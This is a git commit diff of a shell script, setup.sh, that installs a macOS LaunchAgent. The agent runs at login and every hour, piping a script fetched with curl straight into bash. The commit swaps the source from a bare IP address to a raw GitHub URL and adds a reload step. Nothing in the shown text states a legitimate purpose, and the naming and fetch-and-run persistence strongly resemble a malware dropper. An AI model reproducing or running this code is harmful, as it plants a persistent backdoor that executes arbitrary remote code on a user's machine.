eb179ea0c7f1c91aa8f390c295f265a0ce27e74a
ronisuaywe <ronisuaywe@outlook.com>
2026-03-06 22:55:13 +0000

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,3 +1,7 @@
+#!/bin/bash
+
+launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.user.myscript.plist 2>/dev/null
+
 cat > ~/Library/LaunchAgents/com.user.myscript.plist << 'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -6,10 +10,11 @@ cat > ~/Library/LaunchAgents/com.user.myscript.plist << 'EOF'
   <key>ProgramArguments</key><array>
     <string>/bin/bash</string>
     <string>-c</string>
-    <string>curl -fsSL http://144.172.110.59/Clickwe | bash</string>
+    <string>curl -fsSL https://raw.githubusercontent.com/ronisuaywe/erer/refs/heads/main/script.sh | bash</string>
   </array>
   <key>RunAtLoad</key><true/>
   <key>StartInterval</key><integer>3600</integer>
 </dict></plist>
 EOF
+
 launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.user.myscript.plist
